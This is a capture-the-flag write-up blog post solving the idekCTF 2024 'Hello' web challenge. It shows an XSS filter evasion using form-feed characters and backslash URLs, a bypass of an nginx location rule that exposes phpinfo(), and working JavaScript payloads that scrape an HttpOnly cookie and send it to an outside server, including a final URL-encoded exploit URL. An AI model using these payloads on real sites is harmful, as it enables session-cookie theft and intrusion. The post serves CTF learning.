---
title: "idekCTF 2024: web/Hello"
date: 2024-08-27
author: Rylie
categories: ["ctf"]
tags: ["web", "idekctf"]
---

> Just to warm you up for the next Fight :"D

Challenge files: [idek-hello.tar.gz](https://nazunacord.net/LOTTMbkwcyak.gz)

We participated in [idekCTF 2024](https://ctf.idek.team/), as extra preparation for [SekaiCTF 2024](https://ctf.sekai.team/), and wow, it is *one hell of a difficult* event. We struggled quite a lot - barely solving a misc challenge, one rev challenge and one web challenge - the one you're reading about now.

At the end, I guess it wasn't *too* complex in any means, but I managed to solve this after a few hours of brainstorming, and I'm proud of it! Let's dive straight into the challenge!

## The challenge

You are given a website, which responds to any parameters with the key `name` with `Hello, <name>`. For example:

```http
GET /?name=yes HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: idek-hello.chal.idek.team:1337
User-Agent: HTTPie

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=UTF-8
Date: Sat, 17 Aug 2024 05:48:12 GMT
Server: nginx/1.27.1
Transfer-Encoding: chunked
Hello, yes
```

Along with it, we have an admin bot. Inspecting the source code from the challenge files, we can see that it spawns a Puppeteer instance, connects to `CHALLENGE_ORIGIN`, setting a `HttpOnly` cookie with the value `FLAG=idek{PLACEHOLDER}`, and then connects to an arbitrary `TARGET_URL` that we can specify.

Our goal is now to *somehow* pull out the cookie to obtain the flag.

## The website

Before we take a look at the source code for the admin bot, I will start with snooping around the webpage itself. The setup is very simple - an `nginx` web server, serving `index.php`:

```php
<?php


function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}


if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>
```

Here, it tries to truncate the string to 24 characters... but forgets to actually pass in the truncated value into `Enhanced_Trim()`. So, the raw value of the parameter `name` is then passed into `Enhanced_Trim()`, which removes all instances of `\r`, `\n`, `\t`, `/`, and spaces.

What this means so far is, we can attempt to insert some magical HTML into here, but `<script>` tags won't work, since you can't close them, as `/` is trimmed away. We can try using `<img onerror="">`, as it doesn't require a closing tag. Once again, spaces are trimmed, so it will result in the HTML `<imgonerror="">`. This isn't what we want.

Luckily, we can insert `U+000C FORM FEED (FF)` as a replacement for spaces, as these are *somehow* valid HTML separators. A little test with `?name=<img%0Conerror%3D"alert("hi")"%0Csrc="">`, and we got ourselves a nice alert popping up on our browser window!

Now then... What's next?

## Randomly fetching things

With the `onerror` attribute now up and rolling, it's time I try fetching something, but clearly that wouldn't be easy. For any non-relative links, you need the *entire* URL, including the scheme, e.g. `http://some.domain/`.

"But, we can't use the `/` in the parameter!", I hear you say. Well, somehow, someway, the *backwards* slash (`\`) counts as a valid separator in this case, so we can do `http:\\some.domain\` and it will fetch properly. Now that we have a method to fetch from the HTML injection, let's just try leaking the cookie naively. Once again, note that the cookie is set as `HttpOnly`, but it doesn't hurt to try right?

Using [`cloudflared`](https://github.com/cloudflare/cloudflared), I booted up a quick tunnel to expose a Node.js server to the Internet. I will *attempt* to log any response headers to see what comes up.

```js
const http = require('http');

const server = http.createServer((req, res) => {
    console.log('request headers:', req.headers);

    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/plain');
    res.end('hi');
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}/`);
});
```

After injecting into the instance a test cookie by running `document.cookie="test=yes"`, then tagging it as `HttpOnly` in DevTools, I send a simple fetch request with `credentials: "include"`. This *should* send any credentials over...? The HTML in question, after being injected, would look like such:

```html
<img onerror="fetch('http:\\localhost:5000',{credentials:'include'})" src="">
```

Hmm... Nope, doesn't work. Even if it *did* work, it wouldn't work on the remote setup, as they aren't hosted on the same domain. It's time we turn to something else.

## The magic of `phpinfo()`

In the source code given to you, there's also another file alongside `index.php`, and that's `info.php`.

```php
<?php
phpinfo();
?>
```

A simple 3-liner, calling the function `phpinfo()`. So, what does this do? It prints out *all* the current state of PHP for the currently running server, in a very neat page that's easy to parse (this will be very important!).

> `phpinfo()` is also a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. \
> \- [Official PHP manual](https://www.php.net/manual/en/function.phpinfo.php)

So... I can just access `info.php` from the link and get the flag right? Of course, it's not so simple, for two reasons. One, the flag itself only gets injected by the admin bot instance. Two, you *will* get a 403 if you try to access the site, even on a local setup, thanks to this `nginx` config:

```nginx
# unrelated sections omitted for brevity
location = /info.php {
    allow 127.0.0.1;
    deny all;
}
```

Seems like we're at a dead end here. But, let's take a deeper look at the config section following the above:

```nginx
location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
}
```

First, this sets the root to `/usr/share/nginx/html` - the same root as `index.php`. Second, the `location ~ \.php$` matches any requests to `*.php` that isn't **exactly** `info.php`. The file name gets captured and passed into the FastCGI parameter `SCRIPT_FILENAME` as `$fastcgi_script_name`, and then served.

A little quirk about this configuration is requests to `/a.php/b.php` will actually be passed in as `$document_root/a.php`----- That's our way into the PHP info page!

We can test this by going to `/info.php/index.php`, and would you look at that, that's the PHP info page in front of us! Looks like we know what to fetch to find the cookie now!

On the same instance that I've injected the cookie `test=yes`, even after marking it as `HttpOnly`, you can still find it displayed in the info page under the entry `$_COOKIE['test']`. Let's try to get it displayed just through the query first. My method is by using this script:

```js
fetch("info.php\index.php", { credentials: "include" })
    .then(request => request.text())
    .then(data => document.body.innerHTML = data);
```

What this does is fetch the info page, then replacing the original page's body with the PHP page, so we can work with it. An inspection through the tables' HTML, we can see the content is laid out as such:

```html
<tr>
    <td class="e">$_COOKIE['test']</td>
    <td class="v">yes</td>
</tr>
```

It's time for some HTML scraping!

## HTML scraping, my beloved

So, there are *hundreds* of entries like the above, with the only difference being the inner text. How do I fetch the specific thing I want? Here, let me show you.

```js
const element = Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['test']")[0];

const value = element.parentElement.children[1].innerText;

console.log(value);
// yes
```

The code itself should be self-explanatory, but if you need an explanation:

- I grab all elements with the class `e` - this is all the keys on the left side of the table - then filtering for the element that has the exact text I'm looking for, in this case `$_COOKIE['test']`.
- I grab this element's parent element, which should be the `<tr>` in the example above.
- Knowing that this element has exactly two children, I grab the second one (index `1`), and this should be the value of the key I'm looking for.

## Putting all this together

With all of this knowledge, our game plan is clear:

- The admin bot *will* go to the challenge instance, and then set a flag.
- The "visited" URL will be the challenge instance again, but with a script in the `name` parameter to access `info.php`
- Fetch the cookie `FLAG` out and send it back to our server.

Let's craft our script in "normal" JavaScript first.

```js
fetch("info.php\index.php", { credentials: "include" })
    .then(response => response.text())
    .then(data => {
        const element = Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['FLAG']")[0];
        const value = element.parentElement.children[1].innerText;
        fetch("http:\\my.domain\" + value);
    });
```

In the parameter, we have no access to spaces - so we can't really do anything related to variable assignment. Let's make everything a statement.

```js
fetch("info.php\\index.php", { credentials: "include" })
    .then(response => response.text())
    .then(data => {
        fetch("http:\\\\my.domain\\" + Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['FLAG']")[0].parentElement.children[1].innerText;
    }).catch(e => document.body.innerHTML = e);
```

The only thing left we have to do is URL encode it, and pass it into the `name` parameter! Your server under `http://my.domain/` just need to log all paths requested and you should see the flag - URL encoded too of course.

## Conclusion

This wasn't too hard of a web challenge - but it really took a lot of time for me to figure out all the steps and possible vectors. Took me 6 whole hours from like... 10 AM to 4 PM something just to get it done, and I'm genuinely happy about it! I never kicked harder into hyperfocus mode than solving this.

Attached under here is my original draft when I was brainstorming for it...

```md
## todo
- snoop source code
- query `?name=<string>`, plan is to get xss somehow.
    - this is not sanitized, injecting `<script>` works?
        - `Enhanced_Trim($inp)` trims away `/`, can't close `<script>` tag.
    - tracking pixel? `<img onload="">`?
        - `Enhanced_Trim($inp)` trims away spaces, can't write the `onload` attribute.
        - using 0x0C as a replacement for spaces works.
        - sanity check: `<img%0Conerror%3D"alert("hi")"%0Csrc="">` works as we expected.
        - can't do `fetch("http://some.domain")` because forward slashes are trimmed out.
        - seems like the method is to fetch stuff *in* the server?
        - forward a request from our `TARGET_URL` back to the server, including credentials using `{ credentials: "include" }` as an attempt to leak cookies
            - doesn't work, don't even bother, `HttpOnly` too strong.
        - `info.php` prints the result of `phpinfo()`, would it leak the cookie from the request?
            - fetching from the site using `?name=` throws a 403
            - fetching it from the target url *also* throws a 403?
            - inserting `Host` and `Origin` headers doesn't work.
        - vulnerability in nginx config:
            ```
            location ~ \.php$ {
            root           /usr/share/nginx/html;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
            include fastcgi_params;
            fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
            }
            ```
            - can access `info.php` by using `info.php/index.php` as route.
        - now to somehow leak it using the puppeteer instance.
        - `\` is a valid separator -> this works for the the fetches
        - access from the given url because of cors: `?name=%3Cimg%0Conerror%3D%27fetch(%22info.php\\index.php%22%2C%20%7B%20credentials%3A%20%22include%22%7D)%27%0Csrc=%22%22%3E`
        - wait but the flag is set **AFTER** you go to the site.
        - the browser gets set to `null` after you're done -> you don't have a second chance
        - flow looks like:
            - go to site
            - flag gets set
            - **somehow** fetch `info.php` to leak flag
            - send back to our server
        - this means `TARGET_URL` has to be the challenge instance *again* to view leaked flag?
        - final script:`http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Conerror%3D%22fetch%28%27info.php%5C%5Cindex.php%27%2C%7Bcredentials%3A%27include%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3E%7Bdocument.body.innerHTML%3Ddata%3Bfetch%28%27https%3A%5C%5C%5C%5Cbar-fleet-nm-super.trycloudflare.com%5C%5C%27%2BArray.from%28document.getElementsByClassName%28%27e%27%29%29.filter%28item%3D%3Eitem.innerText%3D%3D%3D%27%24_COOKIE%5B%5C%27FLAG%5C%27%5D%27%29%5B0%5D.parentElement.children%5B1%5D.innerText%29%7D%29.catch%28e%3D%3Edocument.body.innerHTML%3De%29%3B%22%0Csrc=%22%22%3E`
        - methodology:
            - bypass nginx config to access `info.php`
            - dump `info.php` to current document
            - fetch flag from the html
            - send a request back to a server
```

Now excuse me, I need a huge nap to recover from all this.
